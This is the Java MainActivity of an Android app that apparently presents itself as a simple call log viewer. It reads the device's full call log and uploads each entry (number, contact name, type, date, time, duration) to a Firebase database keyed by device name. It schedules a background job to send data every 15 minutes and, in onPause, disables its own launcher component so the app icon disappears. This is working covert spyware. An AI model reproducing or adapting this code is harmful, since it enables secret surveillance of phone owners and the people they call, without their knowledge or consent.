package com.codewithshubh.calllogtracker;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final String TAG_SEND_DATA = "Sending data to server";
    private ArrayList<CallLogModel> callLogModelArrayList;
    private RecyclerView rv_call_logs;
    private CallLogAdapter callLogAdapter;

    public String str_number, str_contact_name, str_call_type, str_call_full_date,
            str_call_date, str_call_time, str_call_time_formatted, str_call_duration;

    private SwipeRefreshLayout swipeRefreshLayout;

    // Request code. It can be any number > 0.
    private static final int PERMISSIONS_REQUEST_CODE = 999;

    String[] appPermissions = {
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.READ_PHONE_STATE
    };
    private int flag = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //setting up the title in actionbar
        getSupportActionBar().setTitle("Call Logs");

        //Initialize our views and variables
        Init();

        //check for permission
        if(CheckAndRequestPermission()){
            FetchCallLogs();
        }

        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                //check for permission
                if(CheckAndRequestPermission()){
                    FetchCallLogs();
                }
                swipeRefreshLayout.setRefreshing(false);
            }
        });
        SettingUpPeriodicWork();
    }

    private void SettingUpPeriodicWork() {
        // Create Network constraint
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .setRequiresStorageNotLow(true)
                .build();


        PeriodicWorkRequest periodicSendDataWork =
                new PeriodicWorkRequest.Builder(SendDataWorker.class, 15, TimeUnit.MINUTES)
                        .addTag(TAG_SEND_DATA)
                        .setConstraints(constraints)
                        // setting a backoff on case the work needs to retry
                        //.setBackoffCriteria(BackoffPolicy.LINEAR, PeriodicWorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
                        .build();

        WorkManager workManager = WorkManager.getInstance(this);
        workManager.enqueue(periodicSendDataWork);
    }

    public boolean CheckAndRequestPermission() {
        //checking which permissions are granted
        List<String> listPermissionNeeded = new ArrayList<>();
        for (String item: appPermissions){
            if(ContextCompat.checkSelfPermission(this, item)!= PackageManager.PERMISSION_GRANTED)
                listPermissionNeeded.add(item);
        }

        //Ask for non-granted permissions
        if (!listPermissionNeeded.isEmpty()){
            ActivityCompat.requestPermissions(this, listPermissionNeeded.toArray(new String[listPermissionNeeded.size()]),
                    PERMISSIONS_REQUEST_CODE);
            return false;
        }
        //App has all permissions. Proceed ahead
        return true;
    }

    private void Init() {
        swipeRefreshLayout = findViewById(R.id.activity_main_swipe_refresh_layout);
        rv_call_logs = findViewById(R.id.activity_main_rv);
        rv_call_logs.setHasFixedSize(true);
        rv_call_logs.setLayoutManager(new LinearLayoutManager(this));
        callLogModelArrayList = new ArrayList<>();
        callLogAdapter = new CallLogAdapter(this, callLogModelArrayList);
        rv_call_logs.setAdapter(callLogAdapter);
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if(grantResults[i]==PackageManager.PERMISSION_DENIED){
                    flag = 1;
                    break;
                }
            }
            if (flag==0)
                FetchCallLogs();
        }
    }

    public void FetchCallLogs() {
        // reading all data in descending order according to DATE
        String sortOrder = android.provider.CallLog.Calls.DATE + " DESC";

        Cursor cursor = this.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                sortOrder);

        //clearing the arraylist
        callLogModelArrayList.clear();

        //looping through the cursor to add data into arraylist
        while (cursor.moveToNext()){
            str_number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            str_contact_name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            str_contact_name = str_contact_name==null || str_contact_name.equals("") ? "Unknown" : str_contact_name;
            str_call_type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            str_call_full_date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            str_call_duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

            SimpleDateFormat dateFormatter = new SimpleDateFormat(
                    "dd MMM yyyy");
            str_call_date = dateFormatter.format(new Date(Long.parseLong(str_call_full_date)));

            SimpleDateFormat timeFormatter = new SimpleDateFormat(
                    "HH:mm:ss");
            str_call_time = timeFormatter.format(new Date(Long.parseLong(str_call_full_date)));

            //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");

            str_call_duration = DurationFormat(str_call_duration);

            switch(Integer.parseInt(str_call_type)){
                case CallLog.Calls.INCOMING_TYPE:
                    str_call_type = "Incoming";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    str_call_type = "Outgoing";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    str_call_type = "Missed";
                    break;
                case CallLog.Calls.VOICEMAIL_TYPE:
                    str_call_type = "Voicemail";
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    str_call_type = "Rejected";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    str_call_type = "Blocked";
                    break;
                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    str_call_type = "Externally Answered";
                    break;
                default:
                    str_call_type = "NA";
            }

            CallLogModel callLogItem = new CallLogModel(str_number, str_contact_name, str_call_type,
                    str_call_date, str_call_time, str_call_duration);

            callLogModelArrayList.add(callLogItem);
            SendDataToServer(callLogItem);
        }
        callLogAdapter.notifyDataSetChanged();
    }
    private String getFormatedDateTime(String dateStr, String strInputFormat, String strOutputFormat) {
        String formattedDate = dateStr;
        DateFormat inputFormat = new SimpleDateFormat(strInputFormat, Locale.getDefault());
        DateFormat outputFormat = new SimpleDateFormat(strOutputFormat, Locale.getDefault());
        Date date = null;
        try {
            date = inputFormat.parse(dateStr);
        } catch (ParseException e) {
        }

        if (date != null) {
            formattedDate = outputFormat.format(date);
        }
        return formattedDate;
    }

    @Override
    protected void onPause() {
        super.onPause();
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private String DurationFormat(String duration) {
        String durationFormatted=null;
        if(Integer.parseInt(duration) < 60){
            durationFormatted = duration+" sec";
        }
        else{
            int min = Integer.parseInt(duration)/60;
            int sec = Integer.parseInt(duration)%60;

            if(sec==0)
                durationFormatted = min + " min" ;
            else
                durationFormatted = min + " min " + sec + " sec";

        }
        return durationFormatted;
    }

    private void SendDataToServer(CallLogModel callLogItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("CallLog")
                .child(getDeviceName())
                .child(callLogItem.getCallDate())
                .child(callLogItem.getCallTime());
        myRef.setValue(callLogItem);
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
}